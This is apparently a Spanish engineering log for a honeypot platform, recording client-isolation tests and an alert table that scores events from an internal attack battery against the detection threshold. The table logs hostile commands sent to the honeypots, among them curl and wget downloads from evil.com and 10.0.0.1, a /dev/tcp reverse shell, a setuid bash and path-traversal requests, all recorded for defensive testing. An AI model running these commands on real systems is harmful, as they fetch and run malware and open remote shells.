# Registro de pruebas de aislamiento — TARTARUS

Bitácora de qué se atacó, contra qué puerto, y en qué cliente (flock) apareció.
La regla de oro: si algo asoma en un cliente que no toqué, se investiga por qué.

## Reparto de sensores vigente (`sensor_registry`)

Flota base (plataforma, en el flock por defecto) + los que cada cliente despliega.

| Puerto | Sensor | Protocolo | Flock |
|---|---|---|---|
| 22 | beelzebub-ssh | ssh | Default |
| 23 | beelzebub-telnet | telnet | Default |
| 80 | beelzebub-http | http | Default |
| 3000 | beelzebub-mcp | mcp | Default |
| 8080 | beelzebub-tcp | tcp | Default |
| — | icmp-canary-dev-01 | icmp | Default |
| 502 | modbus-canary-01 | modbus | **Cliente Demo 01** |

Regla de asignación explícita: `honeypot_id = modbus-canary-01 → Cliente Demo 01`.

---

## 2026-08-28 · Reinicio de fábrica + alta de cliente desde cero

Plataforma llevada a **estado de instalación nueva** con `scripts/reinicio_de_fabrica.sh`
(respaldo `backups/db/tartarus_pre_fabrica_20260828_1552.sql.gz`): borrados los flocks de
cliente previos (Iván, IR, Pruebita) y sus reglas, flota base reconstruida por el bootstrap
del engine (6 sensores, todos en Default).

Onboarding de un cliente nuevo **por el flujo real del producto**:
1. `POST /flocks` → «Cliente Demo 01».
2. `POST /flocks/{id}/assignments` → regla `honeypot_id=modbus-canary-01`; sensor Modbus (:502)
   registrado a su nombre.
3. `POST /deploy/execute` → cebo AWS plantado (53 B en disco) y asignado al cliente.

### Prueba de aislamiento

| Hora | Ataque | Puerto | Flock esperado | Resultado (ev./det.) | Veredicto |
|---|---|---|---|---|---|
| ~15:53 | `attack_modbus.sh` | 502 | Cliente Demo 01 | Cliente 10/10 | ✅ Aislado |
| ~15:53 | `curl` HTTP | 80 | Default | Default 5/5 | ✅ Aislado |
| ~15:55 | SSH (sondas) | 22 | Default | Default 60 | ✅ |
| ~15:55 | `attack_tcp.sh` | 8080 | Default | Default 32 | ✅ |
| ~15:55 | `attack_prometheus.sh` | 2113 | Default | Default 10 | ✅ (antes «sin sensor») |
| ~15:55 | `attack_telnet.sh` | 23 | Default | **no llegó** (`TIMEOUT_CONNECT`) | ⚠ Beelzebub |

Desglose final por protocolo/puerto:

| Protocolo | Puerto | Flock | Eventos |
|---|---|---|---|
| MODBUS | 502 | Cliente Demo 01 | 10 |
| SSH | 22 | Default | 60 |
| TCP | 8080 | Default | 31 |
| PROMETHEUS | 2113 | Default | 10 |
| HTTP | 80 | Default | 5 |
| TCP/HTTP | 8080 | Default | 1 |

**Conclusión:** aislamiento correcto. El cliente recibió **solo** sus 10 eventos Modbus
(0 eventos de otro protocolo). Todo lo atacado contra la flota base cayó en Default. Prometheus
(2113), antes «sin sensor», ya atribuye bien.

**Observación para Beelzebub:** el ataque Telnet (:23) devolvió `TIMEOUT_CONNECT` — no aterrizó
ningún evento. Candidato a revisar cuando se aborde la fiabilidad de Beelzebub.

**Nota metodológica:** contar por flock con subconsultas correlacionadas, no con `LEFT JOIN`
encadenados (producto cartesiano infla los conteos).

## 2026-08-30 — Tabla-testigo de alertas (ANTES de la fase B8)

Iván preguntó «¿en qué momento salen las notificaciones?». Esta es la respuesta medida, no supuesta.
Batería completa (`scripts/attack_all.py 127.0.0.1`, 113 peticiones en 7 protocolos) contra la persona
`ubuntu-server` recién aplicada y verificada en vivo. Umbral vivo: **65**.
Instrumento: `scripts/tabla_testigo.py`, que pasa cada evento por la MISMA `should_alert` del motor.

### Lo que revela

- **Ningún evento SSH lleva la táctica `Credential Access`.** Los 172 salen como `Execution` o
  `Discovery`. Es el bug de atribución: el marcador de apertura de Beelzebub se cuenta como comando
  tecleado, suma +10 y de paso pisa la táctica que era la única puerta de salida del login.
- **Un login solo alerta si la contraseña es común.** El script de ataque usa contraseñas del top-50,
  así que sacan 75 (+15) y pasan el umbral. Los dos logins con contraseña cualquiera sacan **60 y
  callan** — exactamente el caso de Iván cuando entra a mano.
- **Telnet inunda.** Sus 40 eventos alertan TODOS, hasta la conexión pelada, porque su rama sí
  conserva `Credential Access` y el filtro anti-ruido `_has_interaction` está roto (mira el envoltorio
  JSON, que nunca está vacío). La bomba estaba armada; ahora está medida.
- **119 de 172 eventos (69%) «alertarían»… y salen ~2 por hora.** Todo el tráfico llega NATeado por
  una sola IP y el limitador de frecuencia es por IP: un único cubo gobierna el 100% del tráfico.
  Y la supresión no deja traza en el log, así que nadie sabe qué no le llegó.

### Tabla completa

| hora | proto | evento | riesgo | táctica MITRE | ¿alerta? | por qué |
|---|---|---|---|---|---|---|
| 05:20:11 | HTTP:80 | `HEAD /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:20:40 | HTTP:80 | `HEAD /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:20:40 | HTTP:80 | `GET /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /admin` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /login` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /wp-admin` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /.env` | 85 | Initial Access | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /phpmyadmin` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /debug/vars` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /config.php` | 85 | Initial Access | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /api/v1/users` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /robots.txt` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /server-status` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /actuator/health` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /etc/passwd` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /etc/shadow` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /..%2f..%2f..%2fetc/passwd` | 70 | Reconnaissance | **SÍ** | riesgo 70 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /.git/config` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /.git/HEAD` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /proc/self/environ` | 70 | Reconnaissance | **SÍ** | riesgo 70 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /WEB-INF/web.xml` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /` | 70 | Reconnaissance | **SÍ** | riesgo 70 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /` | 60 | Reconnaissance | no | riesgo 60, le faltan 5; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `GET /` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /` | 70 | Reconnaissance | **SÍ** | riesgo 70 ≥ 65 |
| 05:24:03 | HTTP:80 | `GET /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `POST /login` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `POST /api` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `POST /search` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `POST /search` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `POST /login` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:03 | HTTP:80 | `POST /comment` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:03 | HTTP:80 | `POST /api` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:03 | HTTP:80 | `POST /api/ping` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:24:23 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:23 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 70 | Execution | **SÍ** | riesgo 70 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 60 | Execution | no | riesgo 60, le faltan 5; táctica 'Execution' no es peligrosa |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 60 | Execution | no | riesgo 60, le faltan 5; táctica 'Execution' no es peligrosa |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `id` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:24 | SSH:22 | `whoami` | 80 | Discovery | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:24 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:26 | SSH:22 | `uname -a` | 80 | Discovery | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:26 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:26 | SSH:22 | `cat /etc/passwd` | 85 | Discovery | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:26 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:26 | SSH:22 | `cat /etc/shadow` | 85 | Discovery | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:26 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:28 | SSH:22 | `ifconfig` | 80 | Discovery | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:28 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:30 | SSH:22 | `netstat -tulnp` | 80 | Discovery | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:30 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:32 | SSH:22 | `ps aux` | 80 | Discovery | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:32 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:34 | SSH:22 | `sudo -l` | 85 | Privilege Escalation | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:34 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:35 | SSH:22 | `curl http://evil.com/backdoor.sh \| ba` | 85 | Command and Control | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:35 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:36 | SSH:22 | `wget http://10.0.0.1:8080/mal -O /tmp/` | 85 | Command and Control | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:36 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:37 | SSH:22 | `chmod +s /bin/bash` | 80 | Execution | **SÍ** | riesgo 80 ≥ 65 |
| 05:24:37 | SSH:22 | `New SSH Login Attempt` | 75 | Execution | **SÍ** | riesgo 75 ≥ 65 |
| 05:24:39 | SSH:22 | `find / -perm -4000 2>/dev/null` | 85 | Discovery | **SÍ** | riesgo 85 ≥ 65 |
| 05:24:59 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP/HTTP:8080 | `GET / HTTP/1.0` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP/HTTP:8080 | `HEAD / HTTP/1.0` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `id; whoami; uname -a` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `SELECT version();` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:02 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:05 | TCP:8080 | `New TCP Session` | 45 | Reconnaissance | no | riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /tools/list` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /admin` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /config` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /debug` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /etc/passwd` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:25 | MCP:3000 | `GET /health` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /metrics` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `GET /openapi.json` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 55 | Reconnaissance | no | riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa |
| 05:25:25 | MCP:3000 | `POST /tools/call` | 85 | Reconnaissance | **SÍ** | riesgo 85 ≥ 65 |
| 05:25:46 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:46 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:46 | TELNET:23 | `show version` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:48 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:48 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:48 | TELNET:23 | `show version` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:49 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:49 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:50 | TELNET:23 | `show version` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:51 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:51 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:52 | TELNET:23 | `show version` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:53 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:53 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:54 | TELNET:23 | `show version` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:55 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:55 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:55 | TELNET:23 | `show version` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:57 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:57 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:57 | TELNET:23 | `show running-config` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:25:58 | TELNET:23 | `show ip interface brief` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:59 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:25:59 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:26:00 | TELNET:23 | `enable` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:26:00 | TELNET:23 | `conf t` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:26:01 | TELNET:23 | `show cdp neighbors` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:26:02 | TELNET:23 | `New TELNET Terminal Session` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:26:02 | TELNET:23 | `New TELNET Login Attempt` | 55 | Credential Access | **SÍ** | táctica peligrosa (Credential Access) + interacción |
| 05:26:04 | TELNET:23 | `busybox` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:26:05 | TELNET:23 | `cat /proc/cpuinfo` | 70 | Credential Access | **SÍ** | riesgo 70 ≥ 65 |
| 05:26:06 | TELNET:23 | `/bin/busybox wget http://evil/bot` | 85 | Credential Access | **SÍ** | riesgo 85 ≥ 65 |
| 05:26:26 | HTTP:80 | `POST /login` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:26:26 | HTTP:80 | `GET /.env` | 85 | Initial Access | **SÍ** | riesgo 85 ≥ 65 |
| 05:26:26 | HTTP:80 | `GET /admin` | 75 | Initial Access | **SÍ** | riesgo 75 ≥ 65 |
| 05:26:26 | HTTP:80 | `GET /` | 50 | Reconnaissance | no | riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa |
| 05:26:46 | PROMETHEUS:2113 | `GET /api/v1/targets` | 70 | Discovery | **SÍ** | riesgo 70 ≥ 65 |
| 05:26:46 | PROMETHEUS:2113 | `GET /` | 50 | Discovery | no | riesgo 50, le faltan 15; táctica 'Discovery' no es peligrosa |
| 05:26:46 | PROMETHEUS:2113 | `GET /metrics` | 70 | Discovery | **SÍ** | riesgo 70 ≥ 65 |

ALERTAN 119 de 172 eventos (69%).
OJO: las 172 vienen de UNA sola IP (192.168.97.1). El limitador de frecuencia es por IP, así que de esas 119 alertas solo saldría ~1 cada 5 minutos.

Por qué callan los que callan:
    20×  riesgo 55, le faltan 10; táctica 'Reconnaissance' no es peligrosa
    15×  riesgo 50, le faltan 15; táctica 'Reconnaissance' no es peligrosa
    14×  riesgo 45, le faltan 20; táctica 'Reconnaissance' no es peligrosa
     2×  riesgo 60, le faltan 5; táctica 'Execution' no es peligrosa
     1×  riesgo 60, le faltan 5; táctica 'Reconnaissance' no es peligrosa
     1×  riesgo 50, le faltan 15; táctica 'Discovery' no es peligrosa
